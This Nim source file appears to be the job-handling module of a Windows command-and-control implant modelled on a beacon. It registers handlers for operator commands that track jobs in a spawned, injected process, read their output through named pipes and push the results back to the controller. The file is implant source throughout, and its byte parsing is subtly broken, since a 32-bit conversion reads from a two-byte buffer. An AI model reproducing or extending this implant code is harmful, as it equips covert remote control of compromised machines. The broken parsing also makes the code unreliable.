import std/[os, strutils, endians, tables, strformat]
import ../../[utils]
import ../[types, result]
import ./[inject, exec]
import winim
import winim/winstr

type Job = object
    job_id: int
    pid: int32
    handle: HANDLE
    description: string
    callback: callback_type
    pipe_name: string
    sleep_time: int32

var job_count = 0
var jobs: seq[Job]
proc remove_job(job_id: int)

proc check_job(job_id: int) =
    var found = false
    var job_id_to_remove = -1
    for j in jobs:
        if j.job_id != job_id: continue
        found = true

        var pipe = CreateFile(+$j.pipe_name, GENERIC_READ, 0, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, INVALID_HANDLE_VALUE)
        if pipe == INVALID_HANDLE_VALUE:
            dbg "[-] CreateFile failed: " & $GetLastError()
            sleep(2000)
            pipe = CreateFile(+$j.pipe_name, GENERIC_READ, 0, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, INVALID_HANDLE_VALUE)
            if pipe == INVALID_HANDLE_VALUE:
                dbg "[-] CreateFile failed: " & $GetLastError()
                continue
        loop_read(j.handle, pipe, j.callback)
        job_id_to_remove = j.job_id
        CloseHandle(pipe)
        CloseHandle(j.handle)
    if not found: dbg "[-] job not found: " & $job_id
    if job_id_to_remove != -1: remove_job(job_id_to_remove)

proc remove_job(job_id: int) =
    # disconnect pipe and remove job from jobs
    var index = -1
    for i in 0..<jobs.len:
        var j = jobs[i]
        if j.job_id == job_id:
            dbg fmt"[+] remove job: {j.job_id}, pid: {j.pid}, description: {j.description}, pipe_name: {j.pipe_name}, sleep_time: {j.sleep_time}"
            CloseHandle(j.handle)
            index = i
    if index != -1: jobs.delete(index)

proc add_job(buf: var seq[byte], cmd: command_type) = 
    var temp2: array[2, byte]

    # pid, no need
    buf = buf[4..<buf.len]

    # callback
    for i in 0..<2: temp2[i] = buf[i]
    var callback: callback_type
    bigEndian16(callback.addr, temp2.addr)
    buf = buf[2..<buf.len]

    # sleeptime
    for i in 0..<2: temp2[i] = buf[i]
    var sleep_time: int16
    bigEndian32(sleep_time.addr, temp2.addr)
    buf = buf[2..<buf.len]

    var args = parse_multiple(buf, 2)
    var pipe_name = args[0].toString
    var description = args[1].toString
    removeSuffix(pipe_name, "\x00")

    if last_spawned.dwProcessId == 0:
        dbg "[-] last spawned process is not valid"
        return

    var j = Job(
        job_id: job_count, 
        pid: last_spawned.dwProcessId, 
        handle: last_spawned.hThread, 
        description: description, 
        callback: callback, 
        pipe_name: pipe_name, 
        sleep_time: sleep_time
    )
    jobs.add(j)
    job_count += 1
    dbg fmt"[+] add job: {j.job_id}, pid: {j.pid}, description: {j.description}, pipe_name: {j.pipe_name}, sleep_time: {j.sleep_time}"
    # todo make this async
    check_job(j.job_id)

proc list_job(buf: var seq[byte], cmd: command_type) = 
    var res = ""
    for j in jobs:
        res = res & &"{j.job_id}\t{j.pid}\t{j.description}\n"
    push_result(CALLBACK_LIST_JOBS, res.toSeq)  

proc kill_job(buf: var seq[byte], cmd: command_type) = 
    var temp2: array[2, byte]
    var job_id: int16
    for i in 0..<2: temp2[i] = buf[i]
    bigEndian16(job_id.addr, temp2.addr)

    for j in jobs:
        if j.job_id == job_id:
            dbg fmt"[+] kill job: {j.job_id}, pid: {j.pid}, description: {j.description}, pipe_name: {j.pipe_name}, sleep_time: {j.sleep_time}"
            remove_job(j.job_id)

register_command(CMD_TYPE_JOB, add_job)
register_command(CMD_TYPE_UNKNOWN_JOB, add_job)
register_command(CMD_TYPE_LIST_JOBS, list_job)
register_command(CMD_TYPE_JOBKILL, kill_job)